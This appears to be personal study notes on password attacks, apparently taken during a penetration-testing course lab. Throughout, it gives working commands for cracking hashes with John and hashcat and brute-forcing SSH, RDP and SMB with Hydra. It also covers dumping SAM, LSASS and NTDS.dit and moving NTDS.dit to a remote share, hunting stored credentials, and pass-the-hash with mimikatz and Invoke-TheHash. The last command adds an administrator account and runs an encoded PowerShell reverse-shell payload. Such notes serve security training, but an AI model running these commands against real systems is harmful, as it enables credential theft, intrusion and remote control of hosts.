--- title: "password attacks"
weight: 20
---
Username: kali  
Hash Algorithm: Yescrypt ($y$)  
Salt: lxhAOT0lf3zR/cuNiG8OX.  
Hash: XEOi/b8Qy6I3nbYZl9RJnMQw3HiykbffrD6X1okqi.0  
Last Change: 20176 (around 2025)  
Min Days: 0 (can change password any time)  
Max Days: 99999 (password never expires)  
Warning: 7 days before expiry

&nbsp;

irfan:$y$j9T$u7t3UrHAk.3WIkkecUE1y0$Q/aAFtrBrik/LKHFUp7vahK72JQtJDpLKRgKWAMAXaD:20120:0:99999:7:::

&nbsp;

&nbsp;

john

"john.pot" (`~/.john/john.pot`)

john --list=formats  
Or:

bash  
Copy  
Edit  
john --show hashes.txt  
(It will try to parse and show hash types.)

&nbsp;

#### Cracking with John

| **Hash Format** | **Example Command** | **Description** |
| --- | --- | --- |
| afs | `john --format=afs hashes_to_crack.txt` | AFS (Andrew File System) password hashes |
| bfegg | `john --format=bfegg hashes_to_crack.txt` | bfegg hashes used in Eggdrop IRC bots |
| bf  | `john --format=bf hashes_to_crack.txt` | Blowfish-based crypt(3) hashes |
| bsdi | `john --format=bsdi hashes_to_crack.txt` | BSDi crypt(3) hashes |
| crypt(3) | `john --format=crypt hashes_to_crack.txt` | Traditional Unix crypt(3) hashes |
| des | `john --format=des hashes_to_crack.txt` | Traditional DES-based crypt(3) hashes |
| dmd5 | `john --format=dmd5 hashes_to_crack.txt` | DMD5 (Dragonfly BSD MD5) password hashes |
| dominosec | `john --format=dominosec hashes_to_crack.txt` | IBM Lotus Domino 6/7 password hashes |
| EPiServer SID hashes | `john --format=episerver hashes_to_crack.txt` | EPiServer SID (Security Identifier) password hashes |
| hdaa | `john --format=hdaa hashes_to_crack.txt` | hdaa password hashes used in Openwall GNU/Linux |
| hmac-md5 | `john --format=hmac-md5 hashes_to_crack.txt` | hmac-md5 password hashes |
| hmailserver | `john --format=hmailserver hashes_to_crack.txt` | hmailserver password hashes |
| ipb2 | `john --format=ipb2 hashes_to_crack.txt` | Invision Power Board 2 password hashes |
| krb4 | `john --format=krb4 hashes_to_crack.txt` | Kerberos 4 password hashes |
| krb5 | `john --format=krb5 hashes_to_crack.txt` | Kerberos 5 password hashes |
| LM  | `john --format=LM hashes_to_crack.txt` | LM (Lan Manager) password hashes |
| lotus5 | `john --format=lotus5 hashes_to_crack.txt` | Lotus Notes/Domino 5 password hashes |
| mscash | `john --format=mscash hashes_to_crack.txt` | MS Cache password hashes |
| mscash2 | `john --format=mscash2 hashes_to_crack.txt` | MS Cache v2 password hashes |
| mschapv2 | `john --format=mschapv2 hashes_to_crack.txt` | MSCHAP v2 password hashes |
| mskrb5 | `john --format=mskrb5 hashes_to_crack.txt` | MS Kerberos 5 password hashes |
| mssql05 | `john --format=mssql05 hashes_to_crack.txt` | MS SQL 2005 password hashes |
| mssql | `john --format=mssql hashes_to_crack.txt` | MS SQL password hashes |
| mysql-fast | `john --format=mysql-fast hashes_to_crack.txt` | MySQL fast password hashes |
| mysql | `john --format=mysql hashes_to_crack.txt` | MySQL password hashes |
| mysql-sha1 | `john --format=mysql-sha1 hashes_to_crack.txt` | MySQL SHA1 password hashes |
| NETLM | `john --format=netlm hashes_to_crack.txt` | NETLM (NT LAN Manager) password hashes |
| NETLMv2 | `john --format=netlmv2 hashes_to_crack.txt` | NETLMv2 (NT LAN Manager version 2) password hashes |
| NETNTLM | `john --format=netntlm hashes_to_crack.txt` | NETNTLM (NT LAN Manager) password hashes |
| NETNTLMv2 | `john --format=netntlmv2 hashes_to_crack.txt` | NETNTLMv2 (NT LAN Manager version 2) password hashes |
| NEThalfLM | `john --format=nethalflm hashes_to_crack.txt` | NEThalfLM (NT LAN Manager) password hashes |
| md5ns | `john --format=md5ns hashes_to_crack.txt` | md5ns (MD5 namespace) password hashes |
| nsldap | `john --format=nsldap hashes_to_crack.txt` | nsldap (OpenLDAP SHA) password hashes |
| ssha | `john --format=ssha hashes_to_crack.txt` | ssha (Salted SHA) password hashes |
| NT  | `john --format=nt hashes_to_crack.txt` | NT (Windows NT) password hashes |
| openssha | `john --format=openssha hashes_to_crack.txt` | OPENSSH private key password hashes |
| oracle11 | `john --format=oracle11 hashes_to_crack.txt` | Oracle 11 password hashes |
| oracle | `john --format=oracle hashes_to_crack.txt` | Oracle password hashes |
| pdf | `john --format=pdf hashes_to_crack.txt` | PDF (Portable Document Format) password hashes |
| phpass-md5 | `john --format=phpass-md5 hashes_to_crack.txt` | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps | `john --format=phps hashes_to_crack.txt` | PHPS password hashes |
| pix-md5 | `john --format=pix-md5 hashes_to_crack.txt` | Cisco PIX MD5 password hashes |
| po  | `john --format=po hashes_to_crack.txt` | Po (Sybase SQL Anywhere) password hashes |
| rar | `john --format=rar hashes_to_crack.txt` | RAR (WinRAR) password hashes |
| raw-md4 | `john --format=raw-md4 hashes_to_crack.txt` | Raw MD4 password hashes |
| raw-md5 | `john --format=raw-md5 hashes_to_crack.txt` | Raw MD5 password hashes |
| raw-md5-unicode | `john --format=raw-md5-unicode hashes_to_crack.txt` | Raw MD5 Unicode password hashes |
| raw-sha1 | `john --format=raw-sha1 hashes_to_crack.txt` | Raw SHA1 password hashes |
| raw-sha224 | `john --format=raw-sha224 hashes_to_crack.txt` | Raw SHA224 password hashes |
| raw-sha256 | `john --format=raw-sha256 hashes_to_crack.txt` | Raw SHA256 password hashes |
| raw-sha384 | `john --format=raw-sha384 hashes_to_crack.txt` | Raw SHA384 password hashes |
| raw-sha512 | `john --format=raw-sha512 hashes_to_crack.txt` | Raw SHA512 password hashes |
| salted-sha | `john --format=salted-sha hashes_to_crack.txt` | Salted SHA password hashes |
| sapb | `john --format=sapb hashes_to_crack.txt` | SAP CODVN B (BCODE) password hashes |
| sapg | `john --format=sapg hashes_to_crack.txt` | SAP CODVN G (PASSCODE) password hashes |
| sha1-gen | `john --format=sha1-gen hashes_to_crack.txt` | Generic SHA1 password hashes |
| skey | `john --format=skey hashes_to_crack.txt` | S/Key (One-time password) hashes |
| ssh | `john --format=ssh hashes_to_crack.txt` | SSH (Secure Shell) password hashes |
| sybasease | `john --format=sybasease hashes_to_crack.txt` | Sybase ASE password hashes |
| xsha | `john --format=xsha hashes_to_crack.txt` | xsha (Extended SHA) password hashes |
| zip | `john --format=zip hashes_to_crack.txt` | ZIP (WinZip) password hashes |

#### Wordlist Mode

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ john --wordlist=<wordlist_file> --rules <hash_file>
```

&nbsp;

&nbsp;

File extension crack

&nbsp;

|     | **Description** |
| --- | --- |
| `pdf2john` | Converts PDF documents for John |
| `ssh2john` | Converts SSH private keys for John |
| `mscash2john` | Converts MS Cash hashes for John |
| `keychain2john` | Converts OS X keychain files for John |
| `rar2john` | Converts RAR archives for John |
| `pfx2john` | Converts PKCS#12 files for John |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John |
| `keepass2john` | Converts KeePass databases for John |
| `vncpcap2john` | Converts VNC PCAP files for John |
| `putty2john` | Converts PuTTY private keys for John |
| `zip2john` | Converts ZIP archives for John |
| `hccap2john` | Converts WPA/WPA2 handshake captures for John |
| `office2john` | Converts MS Office documents for John |
| `wpa2john` | Converts WPA/WPA2 handshakes for John  <br><br/>   <br><br/> |

07/07/2025 11:23

&nbsp;

```shell-session
cube111@local[/local]$ locate *2john*
```

&nbsp;

&nbsp;

winrm

```shell-session
cube111@local[/local]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

&nbsp;

#### Evil-WinRM Usage
Network Services

```shell-session
cube111@local[/local]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

&nbsp;

&nbsp;

#### Hydra - SSH
We can use a tool such as `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

Network Services

```shell-session
cube111@local[/local]$ hydra -L user.list -P password.list ssh://10.129.42.197
```

&nbsp;

&nbsp;

#### Hydra - RDP
We can also use `Hydra` to perform RDP bruteforcing.

Network Services

```shell-session
cube111@local[/local]$ hydra -L user.list -P password.list rdp://10.129.42.197
```

&nbsp;

&nbsp;SMB

```shell-session
cube111@local[/local]$ hydra -L user.list -P password.list smb://10.129.42.197
```

&nbsp;

Hashcat

Identifying Hashes

```shell-session
$1$  : MD5
$2a$ : Blowfish
$2y$ : Blowfish, with correct handling of 8 bit characters
$5$  : SHA256
$6$  : SHA512
```

&nbsp;

-a 0 simple wordlist

┌─[irfan☺cube]─[~]  
└──╼ $hashcat -a 0 -m 3200 b /usr/share/wordlists/rockyou.txt

&nbsp;

-a 1 combination attack mode

```shell-session
cube111@local[/local]$ awk '(NR==FNR) { a[NR]=$0 } (NR != FNR) { for (i in a) { print $0 a[i] } }' file2 file1

superhello
superpassword
worldhello
wordpassword
secrethello
secretpassword
```

&nbsp;

#### Hashcat - Syntax
The syntax for the combination attack is:

Combination Attack

```shell-session
cube111@local[/local]$ hashcat -a 1 -m <hash type> <hash file> <wordlist1> <wordlist2>
```

&nbsp;

-a 3 mask attack

```shell-session
cube111@local[/local]$ hashcat -a 3 -m 0 md5_mask_example_hash -1 01 'ILFREIGHT?l?l?l?l?l20?1?d'
```

| **Placeholder** | **Meaning** |
| --- | --- |
| ?l  | lower-case ASCII letters (a-z) |
| ?u  | upper-case ASCII letters (A-Z) |
| ?d  | digits (0-9) |
| ?h  | 0123456789abcdef |
| ?H  | 0123456789ABCDEF |
| ?s  | special characters (\"space\"!"#$%&'()*+,-./:;&lt;=&gt;?@\[\]^\_`{ |
| ?a  | ?l?u?d?s |
| ?b  | 0x00 - 0xff |

&nbsp;

-a6 and -a7  hybrid attack

```shell-session
cube111@local[/local]$ hashcat -a 6 -m 0 hybrid_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt '?d?s'
```

```shell-session
cube111@local[/local]$ hashcat -a 7 -m 0 hybrid_hash_prefix -1 01 '20?1?d' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

&nbsp;

hashcat rules

&nbsp;

| **Function** | **Description** |
| --- | --- |
| `:` | Do nothing. |
| `l` | Lowercase all letters. |
| `u` | Uppercase all letters. |
| `c` | Capitalize the first letter and lowercase others. |
| `sXY` | Replace all instances of X with Y. |
| `$!` | Add the exclamation character at the end. |

```shell-session
cube111@local[/local]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

&nbsp;

```shell-session
cube111@local[/local]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

&nbsp;

&nbsp;

#### Generating Wordlists Using CeWL

&nbsp;

```shell-session
cube111@local[/local]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
cube111@local[/local]$ wc -l inlane.wordlist

326
```

&nbsp;

DEFAULT CREDS
https://github.com/ihebski/DefaultCreds-cheat-sheet

&nbsp;

<ins>Credential Stuffing</ins>

(`username:password`). In addition, we can select the passwords and mutate them by our `rules` to increase the probability of hits.

&nbsp;

```shell-session
cube111@local[/local]$ hydra -C <user_pass.list> <protocol>://<IP>
```

&nbsp;

https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv

&nbsp;

&nbsp;

&nbsp;

ATTACKING SAM

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```shell-session
cube111@local[/local]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

&nbsp;

DUMPING SAM and creds from lsass when u dont have system access directly

&nbsp;

```shell-session
cube111@local[/local]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p local_@cademy_stdnt! --lsa
```

```shell-session
cube111@local[/local]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p local_@cademy_stdnt! --sam
```

&nbsp;

&nbsp;

&nbsp;

Attacking lsass(credential guard should be disabled)

Get-CimInstance -ClassName Win32_DeviceGuard -Namespace Root\\Microsoft\\Windows\\DeviceGuard

can right click in task manager and create dump

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

here 672 is the PID

now read the dump with this

```shell-session
cube111@local[/local]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

&nbsp;

&nbsp;

&nbsp;

Attacking ntds.Dit

&nbsp;

| Username Convention | Practical Example for Jane Jill Doe |
| --- | --- |
| `firstinitiallastname` | jdoe |
| `firstinitialmiddleinitiallastname` | jjdoe |
| `firstnamelastname` | janedoe |
| `firstname.lastname` | jane.doe |
| `lastname.firstname` | doe.jane |
| `nickname` | doedoehacksstuff |

&nbsp;

&nbsp;

![7b0581b2c8a2fb6690da2578edcd1c1b.png](/resources/7b0581b2c8a2fb6690da2578edcd1c1b.png)

&nbsp;

```shell-session
cube111@local[/local]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

```shell-session
Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

&nbsp;

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

&nbsp;

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

&nbsp;

&nbsp;

Credential Hunting Windows

&nbsp;

![5715860fcd66a3c1821143da6dd4dbba.png](/resources/5715860fcd66a3c1821143da6dd4dbba.png)

&nbsp;

|     |     |     |
| --- | --- | --- |
| Passwords | Passphrases | Keys |
| Username | User account | Creds |
| Users | Passkeys | Passphrases |
| configuration | dbcredential | dbpassword |
| pwd | Login | Credentials |

&nbsp;

&nbsp;

#### Running Lazagne All

Credential Hunting in Windows

```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all
```

&nbsp;

&nbsp;

#### Using findstr

We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

Credential Hunting in Windows

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

&nbsp;

&nbsp;

dir /s /b \*password\*.\*

&nbsp;

&nbsp;

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

&nbsp;

&nbsp;credential hunting linux  FUCKING USELESS

config

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;
```

&nbsp;

```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

&nbsp;

#### Databases

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

&nbsp;

text files

```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

&nbsp;scripts

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

&nbsp;

&nbsp;

#### SSH Private Keys

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

#### SSH Public Keys

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

&nbsp;

&nbsp;

&nbsp;

#### Cronjobs

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ cat /etc/crontab
```

&nbsp;

&nbsp;

History

```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
```

&nbsp;

&nbsp;

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

| **Application Logs** | **Event Logs** | **Service Logs** | **System Logs** |
| --- | --- | --- | --- |

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

| **Log File** | **Description** |
| --- | --- |
| `/var/log/messages` | Generic system activity logs. |
| `/var/log/syslog` | Generic system activity logs. |
| `/var/log/auth.log` | (Debian) All authentication related logs. |
| `/var/log/secure` | (RedHat/CentOS) All authentication related logs. |
| `/var/log/boot.log` | Booting information. |
| `/var/log/dmesg` | Hardware and drivers related information and logs. |
| `/var/log/kern.log` | Kernel related warnings, errors and logs. |
| `/var/log/faillog` | Failed login attempts. |
| `/var/log/cron` | Information related to cron jobs. |
| `/var/log/mail.log` | All mail server related logs. |
| `/var/log/httpd` | All Apache related logs. |
| `/var/log/mysqld.log` | All MySQL server related logs. |

&nbsp;

&nbsp;

```shell-session
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

&nbsp;

&nbsp;

#### Memory - Mimipenguin

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```

&nbsp;

&nbsp;

#### Memory - LaZagne

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```

&nbsp;

&nbsp;

#### Browsers

&nbsp;

#### Firefox Stored Credentials

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default
```

&nbsp;

#### Decrypting Firefox Credentials

Credential Hunting in Linux

```shell-session
cube111@local[/local]$ python3.9 firefox_decrypt.py
```

&nbsp;

&nbsp;

#### Browsers - LaZagne

Credential Hunting in Linux

```shell-session
cry0l1t3@unixclient:~$ python3 laZagne.py browsers
```

&nbsp;

&nbsp;

# Passwd, Shadow & Opasswd

mechanisms is [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html) (`PAM`). The modules used for this are called `pam_unix.so` or `pam_unix2.so` and are located in `/usr/lib/x86_x64-linux-gnu/security/` in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. Fo

&nbsp;

Usually, we find the value `x` in this field, which means that the passwords are stored in an encrypted form in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as `root`.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

#### Shadow Format

&nbsp;

|     | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937` | `:` | `0` | `:` | `99`  <br><br/>`999` | `:` | `7` | `:` | `:` | `:` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Username |     | Encrypted password |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date |     |

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ sudo cp /etc/shadow /tmp/shadow.bak 
cube111@local[/local]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes

Passwd, Shadow & Opasswd

```shell-session
cube111@local[/local]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes

Passwd, Shadow & Opasswd

```shell-session
cube111@local[/local]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

Passwd, Shadow & Opasswd

```shell-session
cube111@local[/local]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

## Opasswd

The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

#### Reading /etc/security/opasswd

Passwd, Shadow & Opasswd

```shell-session
cube111@local[/local]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

&nbsp;

&nbsp;

&nbsp;

## Pass the Hash with Mimikatz (Windows)

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user\'s password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user\'s context (if not specified, it will launch cmd.exe).
- ```cmd-session
                        c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.local /run:cmd.exe" exit
    ```
    

&nbsp;

&nbsp;

2nd method

https://github.com/Kevin-Robertson/Invoke-TheHash

&nbsp;smbexec

```powershell-session
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.local -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

&nbsp;

&nbsp;

wmiexec

&nbsp;![e9fe82535e21dba8b4407caa556f89f2.png](/resources/e9fe82535e21dba8b4407caa556f89f2.png)

```powershell-session
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.local -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZReadABTAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==